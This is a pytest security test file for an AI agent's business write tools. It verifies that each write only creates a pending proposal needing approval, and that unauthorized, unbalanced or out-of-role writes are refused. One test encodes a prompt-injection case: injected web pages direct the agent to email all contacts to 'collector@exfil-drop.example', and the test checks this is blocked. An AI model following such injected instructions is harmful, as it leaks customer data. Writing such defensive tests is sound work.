"""Every write tool returns a pending proposal and writes no business table (§11, D8, 二.12)."""

from __future__ import annotations

import pytest

from tests.mcp.support import WRITER_AGENT, count, owner_rows

pytestmark = [pytest.mark.anyio, pytest.mark.security]

BUSINESS_TABLES = ["crm.interactions", "crm.opportunities", "eng.tickets", "eng.ticket_comments",
                   "fin.journal_entries", "hr.requisitions", "legal.contracts", "ops.outbox"]
CONTACT = "esila.beernink@havenmeer-distributie.example"  # contact of A-0002 (sales_staff's account)


def snapshot() -> dict:
    snap = {t: count(t) for t in BUSINESS_TABLES}
    snap["opp_stage"] = owner_rows("SELECT stage FROM crm.opportunities WHERE opp_id = 'O-0002'")[0]["stage"]
    return snap


WRITES = [
    ("sales_staff", "sales_profile", "crm", "log_interaction", 2,
     {"account_id": "A-0002", "kind": "call", "summary": "Discussed pilot scope.", "contact_id": "CT-00004"}),
    ("sales_staff", "sales_profile", "crm", "update_opportunity_stage", 2, {"opp_id": "O-0002", "stage": "proposal"}),
    ("sales_staff", "sales_profile", "crm", "send_email", 3,
     {"account_id": "A-0002", "to": CONTACT, "subject": "Pilot plan", "body": "Hi Esila, here is the plan."}),
    ("eng_staff", WRITER_AGENT, "code", "create_ticket", 2,
     {"project_id": "P-01", "title": "Depot import fails on empty rows", "description": "Steps to reproduce ...",
      "type": "bug"}),
    ("eng_staff", WRITER_AGENT, "code", "comment_ticket", 2, {"ticket_id": "FP-1002", "comment": "Looking into it."}),
    ("finance_staff", WRITER_AGENT, "finance", "post_journal_entry", 3,
     {"posted_on": "2026-09-30", "description": "Accrual for audit fees",
      "lines": [{"account_code": "6900", "dept": "finance", "debit_eur": "1200.00"},
                {"account_code": "3700", "dept": "finance", "credit_eur": 1200}]}),
    ("hr_staff", "hr_headcount", "hris", "create_requisition", 2,
     {"dept": "eng", "title": "Backend Engineer", "headcount": 1, "jd_text": "Python, Postgres.",
      "hard_requirements": ["3 years Python"]}),
    ("legal_staff", "legal_review", "legal", "create_contract_draft", 2,
     {"account_id": "A-0003", "contract_type": "NDA", "text": "Mutual NDA between the parties ..."}),
    ("legal_staff", "legal_review", "legal", "send_contract", 3,
     {"contract_id": "C-0003", "to": CONTACT, "subject": "Renewal terms"}),
]


@pytest.mark.parametrize("persona,agent,domain,tool,tier,args", WRITES, ids=[w[3] for w in WRITES])
async def test_write_tool_returns_pending_proposal_and_writes_nothing(call, writer_agent, persona, agent, domain,
                                                                      tool, tier, args):
    before = snapshot()
    env = await call(persona, agent, domain, tool, **args)
    assert env.ok, env
    assert env.status == "pending" and env.tier == tier and env.proposal_id.startswith("prop_")
    assert env.data == {"proposal_id": env.proposal_id, "status": "pending", "tier": tier}
    assert snapshot() == before
    row = owner_rows("SELECT * FROM ops.proposals WHERE id = %s", (env.proposal_id,))[0]
    assert row["status"] == "pending" and row["domain"] == domain and row["tool"] == tool
    assert row["requester_id"] == call.personas[persona].user_id and row["agent"] == agent
    assert row["tier"] == tier and row["level"] >= 2
    assert f"user:{row['requester_id']}" in row["acl_groups"] and "role:ceo" in row["acl_groups"]


async def test_send_email_to_an_address_from_a_web_page_is_refused(call):
    """The injected pages ask for mail to an attacker address: refused before any proposal exists."""
    before = count("ops.proposals")
    env = await call("sales_staff", "sales_profile", "crm", "send_email", account_id="A-0002",
                     to="collector@exfil-drop.example", subject="Contacts", body="All contacts attached.")
    assert not env.ok and env.error == "recipient_not_contact" and env.proposal_id is None
    assert count("ops.proposals") == before


async def test_cannot_propose_on_rows_you_cannot_see(call):
    before = count("ops.proposals")
    env = await call("sales_staff", "sales_profile", "crm", "send_email", account_id="A-0001",
                     to="someone@nordhafen-logistik.example", subject="Hi", body="Hello")
    assert not env.ok and env.error == "not_found_or_denied"
    assert env.denied[0] == {"id": "crm.account:A-0001", "reason": "not found or no permission"}
    stage = await call("sales_staff", "sales_profile", "crm", "update_opportunity_stage", opp_id="O-0001",
                       stage="closed_won")
    assert not stage.ok and stage.error == "not_found_or_denied"
    assert count("ops.proposals") == before


async def test_unbalanced_journal_entry_is_refused(call, writer_agent):
    env = await call("finance_staff", WRITER_AGENT, "finance", "post_journal_entry", posted_on="2026-09-30",
                     description="x", lines=[{"account_code": "6900", "debit_eur": "10.00"},
                                             {"account_code": "3700", "credit_eur": "9.99"}])
    assert not env.ok and env.error == "bad_arguments" and "balance" in env.message


async def test_requisition_outside_hr_is_refused(call):
    env = await call("sales_head", "hr_headcount", "hris", "create_requisition", dept="sales", title="AE",
                     headcount=1, jd_text="Sell.")
    assert not env.ok and env.error == "tool_denied"  # tool rule: create_requisition is HR's


async def test_claimed_params_are_bound_by_hash(call):
    env = await call("sales_staff", "sales_profile", "crm", "update_opportunity_stage", opp_id="O-0002",
                     stage="negotiation")
    from corpai.proposals import canonical_params, params_hash

    row = owner_rows("SELECT * FROM ops.proposals WHERE id = %s", (env.proposal_id,))[0]
    assert row["params_text"] == canonical_params({"opp_id": "O-0002", "stage": "negotiation"})
    assert row["params_hash"] == params_hash({"stage": "negotiation", "opp_id": "O-0002"})
